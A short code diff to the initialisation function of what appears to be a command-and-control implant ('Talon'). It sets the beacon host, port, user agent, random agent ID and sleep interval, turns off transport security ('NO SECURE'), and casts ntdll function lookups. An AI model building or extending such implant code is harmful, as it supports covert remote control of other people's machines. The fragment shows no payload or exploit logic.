@@ -11,11 +11,11 @@ VOID TalonInit()
     Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
     Instance.Config.Transport.Host      = CONFIG_HOST;
     Instance.Config.Transport.Port      = CONFIG_PORT;
-    Instance.Config.Transport.Secure    = CONFIG_PORT;
+    Instance.Config.Transport.Secure    = 0x0; // NO SECURE
 
     // Init Win32
-    Instance.Win32.RtlRandomEx   = GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlRandomEx" );
-    Instance.Win32.RtlGetVersion = GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlGetVersion" );
+    Instance.Win32.RtlRandomEx   = (ULONG (*)(ULONG *)) GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlRandomEx" );
+    Instance.Win32.RtlGetVersion = (void (*)(struct _OSVERSIONINFOEXW *)) GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlGetVersion" );
 
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
